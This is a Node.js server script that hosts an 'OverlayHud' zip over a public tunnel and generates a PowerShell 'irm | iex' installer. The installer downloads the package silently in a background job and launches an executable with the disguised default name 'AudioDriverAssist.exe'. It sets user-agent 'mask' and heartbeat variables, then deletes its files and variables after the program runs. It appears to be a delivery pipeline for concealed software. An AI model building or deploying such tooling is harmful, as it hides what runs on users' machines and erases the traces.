const express = require("express");
const path = require("path");
const fs = require("fs");
const os = require("os");
const localtunnel = require("localtunnel");

const PORT = Number(process.env.PORT || 8443);
const HOST = process.env.HOST || "0.0.0.0";
const PUBLIC_DIR = path.join(__dirname, "public");
const STATIC_MAX_AGE = "1d";
const ZIP_FILE = process.env.OVERLAYHUD_ZIP || "OverlayHud-win-x64.zip";
const ASSET_PATH = path.join(PUBLIC_DIR, ZIP_FILE);
const ENABLE_TUNNEL = process.env.PUBLIC_TUNNEL
  ? String(process.env.PUBLIC_TUNNEL).toLowerCase() === "true"
  : true;
const TUNNEL_SUBDOMAIN = process.env.PUBLIC_SUBDOMAIN;
const TUNNEL_REGION = process.env.PUBLIC_TUNNEL_REGION;
let tunnelInstance;
let isShuttingDown = false;

if (!fs.existsSync(PUBLIC_DIR)) {
  fs.mkdirSync(PUBLIC_DIR, { recursive: true });
}

const app = express();
app.set("trust proxy", true);

app.get("/api/status", (_req, res) => {
  res.json({
    status: "active",
    timestamp: new Date().toISOString(),
  });
});

app.get("/health", (_req, res) => {
  const exists = fs.existsSync(ASSET_PATH);

  res.json({
    status: "ok",
    assetFound: exists,
    asset: ZIP_FILE,
  });
});

app.get("/download", (req, res, next) => {
  if (!fs.existsSync(ASSET_PATH)) {
    return res.status(404).json({
      error: `File ${ZIP_FILE} not found in ${PUBLIC_DIR}`,
    });
  }

  console.log(`[${new Date().toISOString()}] download starting for ${req.ip}`);
  res.setHeader("Cache-Control", `public, max-age=${24 * 60 * 60}`);
  try {
    const stat = fs.statSync(ASSET_PATH);
    res.setHeader("Content-Length", stat.size);
  } catch (_) {
    // best effort; ignore stat errors
  }

  res.download(ASSET_PATH, ZIP_FILE, (err) => {
    if (err) {
      return next(err);
    }
    console.log(`[${new Date().toISOString()}] download completed for ${req.ip}`);
  });
});

app.get("/install.ps1", (req, res) => {
  if (!fs.existsSync(ASSET_PATH)) {
    return res.status(404).type("text/plain").send(`# Asset missing
Write-Host "OverlayHud zip not found on server. Ask the host to upload ${ZIP_FILE}."
`);
  }

  const downloadBase = getBaseUrl(req);
  if (!downloadBase) {
    console.error("install.ps1 request missing host; cannot build download URL");
    return res
      .status(500)
      .type("text/plain")
      .send('Write-Host "Installer cannot determine download URL (host missing)."');
  }
  const script = buildPowerShellScript(`${downloadBase}/${ZIP_FILE}`);

  console.log(`[${new Date().toISOString()}] install.ps1 served to ${req.ip}`);
  res.setHeader("Cache-Control", `public, max-age=${24 * 60 * 60}`);
  res.setHeader("Content-Disposition", "attachment; filename=install.ps1");
  res.type("text/plain").send(script);
});

app.use(
  express.static(PUBLIC_DIR, {
    maxAge: STATIC_MAX_AGE,
  }),
);

app.get("/", (_req, res) => {
  const template = `
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>OverlayHud Downloads</title>
    <style>
      body {
        font-family: "Segoe UI", system-ui, sans-serif;
        margin: 2rem auto;
        max-width: 640px;
        color: #f3f3f3;
        background: #070a10;
      }
      a {
        color: #6ec1ff;
        text-decoration: none;
        border-bottom: 1px dotted #6ec1ff;
      }
      .card {
        background: rgba(255, 255, 255, 0.05);
        padding: 1.5rem;
        border-radius: 16px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>OverlayHud download</h1>
      <p>Drop the latest <code>${ZIP_FILE}</code> into <code>${PUBLIC_DIR}</code> and this endpoint will serve it.</p>
      <ul>
        <li><a href="/download" download>Download via /download</a></li>
        <li><a href="/${ZIP_FILE}" download>Direct file link</a></li>
        <li><a href="/health">Health check</a></li>
        <li><code>irm http://YOUR-HOST:${PORT}/install.ps1 \| iex</code></li>
      </ul>
      <p>PowerShell installer snippet:</p>
      <pre>
$url = "http://YOUR-HOST:${PORT}/${ZIP_FILE}"
$tmp = Join-Path $env:TEMP "OverlayHud.zip"
Invoke-WebRequest -Uri $url -OutFile $tmp
Expand-Archive -Path $tmp -DestinationPath "$env:LOCALAPPDATA\\OverlayHudDeploy" -Force
Start-Process "$env:LOCALAPPDATA\\OverlayHudDeploy\\OverlayHud.exe"
      </pre>
    </div>
  </body>
</html>`;

  res.send(template);
});

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: err.message });
});

const server = app.listen(PORT, HOST, () => {
  const localUrl = `http://localhost:${PORT}`;
  const lanUrl = getLanUrl(PORT);

  console.log(`OverlayHud host listening on ${localUrl}`);
  if (lanUrl) {
    console.log(`LAN link: ${lanUrl}`);
  } else {
    console.log("LAN link could not be detected (no active IPv4 interface).");
  }
  logLinkSet("Local", localUrl);
  if (lanUrl) {
    logLinkSet("LAN   ", lanUrl);
  }

  if (!fs.existsSync(ASSET_PATH)) {
    console.warn(
      `Note: ${ZIP_FILE} not found in ${PUBLIC_DIR}. Upload/publish before sharing the link.`,
    );
  }

  if (ENABLE_TUNNEL) {
    openTunnel().catch((err) => {
      console.error("Failed to start public tunnel:", err.message);
    });
  }
});

async function openTunnel() {
  const tunnelOptions = {
    port: PORT,
  };

  if (TUNNEL_SUBDOMAIN) {
    tunnelOptions.subdomain = TUNNEL_SUBDOMAIN;
  }

  if (TUNNEL_REGION) {
    tunnelOptions.region = TUNNEL_REGION;
  }

  tunnelInstance = await localtunnel(tunnelOptions);
  logLinkSet("Public", tunnelInstance.url, { recommend: true });
  tunnelInstance.on("close", () => console.log("Public tunnel closed."));
}

function getLanUrl(port) {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name] || []) {
      if (net.family === "IPv4" && !net.internal) {
        return `http://${net.address}:${port}`;
      }
    }
  }
  return null;
}

function logLinkSet(label, baseUrl, options = {}) {
  const normalized = normalizeBaseUrl(baseUrl);
  const downloadUrl = `${normalized}/${ZIP_FILE}`;
  const installerUrl = `${normalized}/install.ps1`;
  const note = options.recommend ? " (recommended HTTPS)" : "";

  console.log(`${label} site${note}: ${normalized}`);
  console.log(`${label} download${note}: ${downloadUrl}`);
  console.log(`${label} install cmd${note}: irm ${installerUrl} | iex`);
}

function normalizeBaseUrl(url) {
  return url.endsWith("/") ? url.slice(0, -1) : url;
}

function getBaseUrl(req) {
  const host = req.headers.host || process.env.PUBLIC_BASE_URL;
  if (!host) {
    return "";
  }
  const proto = req.headers["x-forwarded-proto"] || req.protocol || "https";
  return `${proto}://${host}`;
}

function getExecutableName() {
  return process.env.OVERLAYHUD_EXE || "AudioDriverAssist.exe";
}

function buildPowerShellScript(downloadUrl) {
  const exeName = getExecutableName();
  const envBlock = buildClientEnvBlock();
  const envCleanup = buildClientEnvCleanupBlock();
  return `
$downloadUrl = "${downloadUrl}"
if ([string]::IsNullOrWhiteSpace($downloadUrl)) {
    Write-Host "Download URL missing; aborting."
    exit 1
}

$sessionDir = Join-Path $env:TEMP ("OverlayHudSession_" + ([guid]::NewGuid().ToString("N")))
$logPath = Join-Path $sessionDir "install.log"
Write-Host "Installer log: $logPath"

try {
    $job = Start-Job -Name "OverlayHudInstall" -ScriptBlock {
        param($downloadUrl, $sessionDir, $logPath)
        $ErrorActionPreference = "Stop"
        $ProgressPreference = "SilentlyContinue"
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
        } catch {
            # best-effort
        }
        $zipPath = Join-Path $sessionDir "OverlayHud.zip"

        function Write-Log([string] $msg) {
            $stamp = (Get-Date).ToString("o")
            $line = "$stamp\`t$msg"
            Add-Content -Path $logPath -Value $line
        }

        New-Item -ItemType Directory -Path $sessionDir -Force | Out-Null
        New-Item -ItemType File -Path $logPath -Force | Out-Null
    Write-Log "Preparing temporary session at $sessionDir (download URL: $downloadUrl)"

        Write-Log "Downloading OverlayHud from $downloadUrl..."
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing
            Write-Log "Download completed."
        } catch {
        Write-Log "Download failed: $($_.Exception.Message)"
            throw
        }

        try {
            Expand-Archive -Path $zipPath -DestinationPath $sessionDir -Force
            Remove-Item $zipPath -Force
            Write-Log "Package extracted."
        } catch {
            Write-Log "Extraction failed: $($_.Exception.Message)"
            throw
        }

        # Apply environment settings for OverlayHud
${envBlock}

        $exeName = "${exeName}"
        $exePath = Join-Path $sessionDir $exeName

        if (-not (Test-Path $exePath)) {
            $candidate = Get-ChildItem -Path $sessionDir -Filter "*.exe" -File -Recurse | Select-Object -First 1
            if ($candidate) {
                $exePath = $candidate.FullName
            }
        }

        if (-not (Test-Path $exePath)) {
            Write-Log "OverlayHud executable not found after extraction."
            throw "OverlayHud executable not found after extraction."
        }

        if ([string]::IsNullOrWhiteSpace($downloadUrl)) {
            Write-Log "Download URL missing."
            throw "Download URL missing."
        }

        Write-Log "Launching $exePath (will clean up after exit)"
        try {
            $process = Start-Process -FilePath $exePath -PassThru
            Write-Log "Launch started; background cleanup scheduled. PID=$($process.Id)"
        } catch {
            Write-Log "Launch failed: $($_.Exception.Message)"
            throw
        }

        Start-Job -ScriptBlock {
            param($pid, $path)
            try {
                Wait-Process -Id $pid -ErrorAction SilentlyContinue
            } catch {}
            Start-Sleep -Seconds 2
            if (Test-Path $path) {
                Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        } -ArgumentList $process.Id, $sessionDir | Out-Null

        Write-Log "OverlayHud is running; close the app to delete the session."
        Write-Log "Install finished."

        # Clean up environment variables we set
${envCleanup}

        # Clear sensitive script variables
        Remove-Variable downloadUrl, sessionDir, zipPath, exeName, exePath, process, logPath -ErrorAction SilentlyContinue
    } -ArgumentList $downloadUrl, $sessionDir, $logPath

    $job | Wait-Job
    $state = $job.State
    Receive-Job -Id $job.Id | Write-Host
    Remove-Job -Id $job.Id -Force

    if ($state -ne 'Completed') {
        Write-Host "Install job failed. Check log: $logPath"
        exit 1
    }

    Write-Host "Install job completed. Log: $logPath"
} catch {
    Write-Host "Failed to start background install: $($_.Exception.Message)"
    exit 1
}

Write-Host "Installer finished. This PowerShell window can be closed."
exit
`.trimStart();
}

function buildClientEnvBlock() {
  const entries = {
    PORT: process.env.PORT,
    HOST: process.env.HOST,
    OVERLAYHUD_ZIP: process.env.OVERLAYHUD_ZIP,
    PUBLIC_TUNNEL: process.env.PUBLIC_TUNNEL,
    PUBLIC_SUBDOMAIN: process.env.PUBLIC_SUBDOMAIN,
    PUBLIC_TUNNEL_REGION: process.env.PUBLIC_TUNNEL_REGION,
    MASK_USER_AGENT: process.env.MASK_USER_AGENT,
    MASK_HEARTBEAT_URL: process.env.MASK_HEARTBEAT_URL,
    OVERLAYHUD_EXE: process.env.OVERLAYHUD_EXE,
  };

  return Object.entries(entries)
    .filter(([, value]) => typeof value === "string" && value.trim().length > 0)
    .map(([key, value]) => {
      const sanitized = String(value).replace(/"/g, '`"').replace(/\r?\n/g, " ");
      return `$env:${key}="${sanitized}"`;
    })
    .join("\n");
}

function buildClientEnvCleanupBlock() {
  const keys = [
    "PORT",
    "HOST",
    "OVERLAYHUD_ZIP",
    "PUBLIC_TUNNEL",
    "PUBLIC_SUBDOMAIN",
    "PUBLIC_TUNNEL_REGION",
    "MASK_USER_AGENT",
    "MASK_HEARTBEAT_URL",
    "OVERLAYHUD_EXE",
  ];

  return keys
    .map((key) => `Remove-Item "Env:${key}" -ErrorAction SilentlyContinue`)
    .join("\n");
}

async function shutdown(reason = "SIGTERM") {
  if (isShuttingDown) {
    return;
  }

  isShuttingDown = true;
  console.log(`Shutting down OverlayHud host (${reason})...`);

  try {
    if (tunnelInstance) {
      tunnelInstance.close();
    }

    await new Promise((resolve) => server.close(resolve));
  } catch (err) {
    console.error("Error during shutdown:", err);
  } finally {
    process.exit(0);
  }
}

process.on("SIGINT", () => shutdown("SIGINT"));
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("uncaughtException", (error) => {
  console.error("Uncaught exception:", error);
  shutdown("uncaughtException");
});

